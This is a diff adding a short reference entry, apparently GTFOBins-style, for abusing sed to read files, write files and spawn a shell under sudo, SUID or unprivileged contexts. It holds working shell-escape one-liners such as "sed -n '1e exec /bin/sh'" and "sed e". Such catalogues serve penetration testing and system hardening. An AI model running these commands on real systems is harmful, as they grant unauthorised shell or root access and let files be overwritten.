@@ -1,0 +1,47 @@
+sed
+===
+
+File read
+---------
+
+[Sudo]
+    sed '' /path/to/input-file
+
+[SUID]
+    sed '' /path/to/input-file
+
+[Unprivileged]
+    sed '' /path/to/input-file
+
+File write
+----------
+
+[Sudo]
+    sed -n '1s/.*/DATA/w /path/to/output-file' /etc/hosts
+
+[SUID]
+    sed -n '1s/.*/DATA/w /path/to/output-file' /etc/hosts
+
+[Unprivileged]
+    sed -n '1s/.*/DATA/w /path/to/output-file' /etc/hosts
+
+Shell
+-----
+
+[Sudo]
+    sed -n '1e exec /bin/sh 1>&0' /etc/hosts
+
+[SUID]
+    sed -n '1e exec /bin/sh 1>&0' /etc/hosts
+
+[Unprivileged]
+    sed -n '1e exec /bin/sh 1>&0' /etc/hosts
+
+[Sudo]
+    sed e
+
+[SUID]
+    sed e
+
+[Unprivileged]
+    sed e
